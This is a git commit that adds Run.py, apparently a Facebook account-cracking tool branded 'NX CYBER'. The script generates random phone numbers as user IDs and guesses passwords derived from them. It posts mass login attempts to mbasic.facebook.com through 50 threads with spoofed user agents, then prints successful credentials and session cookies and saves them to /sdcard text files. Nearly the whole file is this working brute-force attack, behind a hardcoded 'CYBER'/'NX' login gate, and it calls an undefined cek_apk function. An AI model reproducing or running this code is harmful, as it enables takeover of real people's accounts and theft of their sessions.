512ab089cc9b53248ec5466c633df1ae5360a8ee
MR.OMAR <105090230+PAID-X-TOOL@users.noreply.github.com>
2023-03-26 08:14:47 +0600

    Create Run.py

---
+++ Run.py
@@ -0,0 +1,279 @@
+# Facebook: Nx Cyber
+# Github: bdhackerboyalif
+import os,sys,time,json,random,re,string,platform,base64,uuid
+os.system("git pull")
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from time import sleep as waktu
+try:
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
+except ModuleNotFoundError:
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+    
+ 
+            
+            
+ 
+class jalan:
+    def __init__(self, z):
+        for e in z + "\n":
+            sys.stdout.write(e)
+            sys.stdout.flush()
+            time.sleep(0.009)
+            
+P = '\x1b[1;97m'
+M = '\x1b[1;91m'
+H = '\x1b[1;92m'
+K = '\x1b[1;93m'
+B = '\x1b[1;94m'
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m'
+N = '\x1b[0m'    
+Z = "\033[1;30m"
+sir = '\033[41m\x1b[1;97m'
+x = '\33[m' # DEFAULT
+m = '\x1b[1;91m' #RED +
+k = '\033[93m' # KUNING +
+xr = '\x1b[1;92m' # HIJAU +
+hh = '\033[32m' # HIJAU -
+u = '\033[95m' # UNGU
+kk = '\033[33m' # KUNING -
+b = '\33[1;96m' # BIRU -
+p = '\x1b[0;34m' # BIRU +
+asu = random.choice([m,k,xr,u,b])
+my_color = [
+ P, M, H, K, B, U, O, N]
+warna = random.choice(my_color)
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today()
+os.system('xdg-open https://www.facebook.com/profile.php?id=100085483789384')
+import getpass
+
+attemps = 0
+
+while attemps < 12345677901:
+      username = input('ENTER USERNAME :')
+      password = input('ENTER PASSWORD :')
+      
+      if username == 'CYBER' and password == 'NX':
+         print('You Have Successfully Logged in.')
+         break 
+      else:
+          print('inccrect plasse type')
+          attemps += 1
+          continue 
+os.system('clear')
+logo =("""
+
+
+                                                                                                                                                          
+                                                                                                                                                          
+NNNNNNNN        NNNNNNNNXXXXXXX       XXXXXXX             CCCCCCCCCCCCCYYYYYYY       YYYYYYYBBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   
+N:::::::N       N::::::NX:::::X       X:::::X          CCC::::::::::::CY:::::Y       Y:::::YB::::::::::::::::B  E::::::::::::::::::::ER::::::::::::::::R  
+N::::::::N      N::::::NX:::::X       X:::::X        CC:::::::::::::::CY:::::Y       Y:::::YB::::::BBBBBB:::::B E::::::::::::::::::::ER::::::RRRRRR:::::R 
+N:::::::::N     N::::::NX::::::X     X::::::X       C:::::CCCCCCCC::::CY::::::Y     Y::::::YBB:::::B     B:::::BEE::::::EEEEEEEEE::::ERR:::::R     R:::::R
+N::::::::::N    N::::::NXXX:::::X   X:::::XXX      C:::::C       CCCCCCYYY:::::Y   Y:::::YYY  B::::B     B:::::B  E:::::E       EEEEEE  R::::R     R:::::R
+N:::::::::::N   N::::::N   X:::::X X:::::X        C:::::C                 Y:::::Y Y:::::Y     B::::B     B:::::B  E:::::E               R::::R     R:::::R
+N:::::::N::::N  N::::::N    X:::::X:::::X         C:::::C                  Y:::::Y:::::Y      B::::BBBBBB:::::B   E::::::EEEEEEEEEE     R::::RRRRRR:::::R 
+N::::::N N::::N N::::::N     X:::::::::X          C:::::C                   Y:::::::::Y       B:::::::::::::BB    E:::::::::::::::E     R:::::::::::::RR  
+N::::::N  N::::N:::::::N     X:::::::::X          C:::::C                    Y:::::::Y        B::::BBBBBB:::::B   E:::::::::::::::E     R::::RRRRRR:::::R 
+N::::::N   N:::::::::::N    X:::::X:::::X         C:::::C                     Y:::::Y         B::::B     B:::::B  E::::::EEEEEEEEEE     R::::R     R:::::R
+N::::::N    N::::::::::N   X:::::X X:::::X        C:::::C                     Y:::::Y         B::::B     B:::::B  E:::::E               R::::R     R:::::R
+N::::::N     N:::::::::NXXX:::::X   X:::::XXX      C:::::C       CCCCCC       Y:::::Y         B::::B     B:::::B  E:::::E       EEEEEE  R::::R     R:::::R
+N::::::N      N::::::::NX::::::X     X::::::X       C:::::CCCCCCCC::::C       Y:::::Y       BB:::::BBBBBB::::::BEE::::::EEEEEEEE:::::ERR:::::R     R:::::R
+N::::::N       N:::::::NX:::::X       X:::::X        CC:::::::::::::::C    YYYY:::::YYYY    B:::::::::::::::::B E::::::::::::::::::::ER::::::R     R:::::R
+N::::::N        N::::::NX:::::X       X:::::X          CCC::::::::::::C    Y:::::::::::Y    B::::::::::::::::B  E::::::::::::::::::::ER::::::R     R:::::R
+NNNNNNNN         NNNNNNNXXXXXXX       XXXXXXX             CCCCCCCCCCCCC    YYYYYYYYYYYYY    BBBBBBBBBBBBBBBBB   EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+                                                                                                                                                          
+
+    
+ â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[\033[1;32m NX CYBER \033[1;32m]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
+ \033[1;93mâ•‘     \033[1;96m[âœ“] CREATED BY\33[0;m   : \033[1;96m NX CYBER       \033[1;93mâ•‘
+ \033[1;93mâ•‘     \033[1;32m[âœ“] FACEBOK      : \033[1;34m NX CYBER   \033[1;93mâ•‘
+ \033[1;93mâ•‘     \033[1;35m[âœ“] GITHUB       :  \033[1;35m CYBER-NX        \033[1;93m â•‘
+ \033[1;93mâ•‘     \033[1;36m[âœ“] TOOL STATUS  : \033[1;36m FREEðŸ˜˜       \033[1;93m â•‘
+ \033[1;93mâ•‘     \033[1;35m[âœ“] TEAM         :  \033[1;35mCyber            \033[1;93m â•‘
+ \033[1;93mâ•‘     \033[1;36m[âœ“] TOOL VIRSION :  \033[1;36m0.2                  \033[1;93m â•‘
+ \033[1;93mâ•‘á¯½âŠ±â”ˆâ”€â”€â•ŒâŠâŠâ•Œâ”€â”€â”ˆâŠ°á¯½âŠ±âŠ°á¯½âŠ±â”ˆâ”€â”€â•ŒâŠâŠâ•Œâ”€â”€â”ˆâŠ°á¯½âŠ±âŠ°á¯½âŠ±â”ˆâ”€â•ŒâŠâŠâ•Œâ”€â”€â”ˆâŠ°á¯½âŠ± \033[1;93mâ•‘
+ \033[1;93mâ•‘  [\033[1;97mâ€¢\033[1;91m]\033[1;32m NX CYBER          \033[1;93m â•‘
+ â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•[\033[1;32mWELCOME TO MY TOOL\033[1;32m]â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•""")
+loop = 0
+oks = []
+cps = []
+def clear():
+    os.system('clear')
+    print(logo)
+from time import localtime as lt
+from os import system as cmd
+ltx = int(lt()[3])
+if ltx > 12:
+    a = ltx-12
+    tag = "PM"
+else:
+    a = ltx
+    tag = "AM"
+    
+    
+try:
+    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    v = 5.2
+    update = ('5.2')
+    update = ('5.2')
+    if str(v) in update:
+        os.system('clear')
+    else:pass
+except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+#global functions
+def dynamic(text):
+    titik = ['.   ','..  ','... ','.... ']
+    for o in titik:
+        print('\r'+text+o),
+        sys.stdout.flush();time.sleep(1)
+ 
+#User agents
+ugen2=[]
+ugen=[]
+ 
+for xd in range(10000):
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(73,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+    
+# APK CHECK
+def xxr():
+    user=[]
+    twf =[]
+    os.getuid
+    os.geteuid
+    os.system("clear")
+    print(logo)
+    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
+    print(" â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+    rk1 = '0191'
+    rk2 = '0192'
+    rk3 = '0195'
+    rk4 = '019'
+    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}â– {x}] Choose : ')
+    os.system('clear')
+    print(logo)
+    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m10000, \x1b[38;5;208m20000, \033[0;92m50000 ] \n\033[0;95mâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        user.append(nmp)
+    os.system("clear")
+    print(logo)
+    passx = 0
+    HamiiID = []
+    print("")
+    for bilal in range(passx):
+        pww = input(f"[*] Enter Password {bilal+1} : ")
+        HamiiID.append(pww)
+    with ThreadPool(max_workers=50) as manshera:
+        clear()
+        tl = str(len(user))
+        jalan('\033[1;97m====================================================')
+        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+        jalan('\033[1;97m====================================================')
+        for love in user:
+            pwx = [love[1:]]
+            uid = code+love
+            for Eman in HamiiID:
+                pwx.append(Eman)
+                pwx.append(love)
+            manshera.submit(rcrack,uid,pwx,tl)
+    print(f"\n{x} â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•")
+def rcrack(uid,pwx,tl):
+    #print(user)
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+			'method': 'GET',
+			'path': 'https://www.facebook.com/?_rdc=1&_rdr',
+			'scheme': 'https',
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'accept-encoding': 'gzip, deflate, br',
+			'accept-language': 'en-US,en;q=0.9',
+			'referer': 'https://t.facebook.com/',
+			'sec-ch-ua': '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
+			'sec-ch-ua-mobile': '?0',
+			'sec-ch-ua-platform': '"Windows"',
+			'sec-fetch-dest': 'document',
+			'sec-fetch-mode': 'navigate',
+			'sec-fetch-site': 'same-origin',
+			'upgrade-insecure-requests': '1',
+			'user-agent': pro,}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print('\r\r\033[1;32m[NX-OKðŸ¥°] ' +uid+ ' | ' +ps+    '  \n[â€Žâ€ŽðŸµï¸]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                cek_apk(session,coki)
+                open('/sdcard/NX-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(cid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[24:39]
+                #print('\r\r\33[1;30m[NX-CPâ˜¹ï¸] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/NX-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(cid)
+                break
+            else:
+                continue
+        loop+=1
+        sys.stdout.write(f'\r\r%s{x}[{xr}NX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.flush()
+    except:
+        pass
+ 
+xxr()
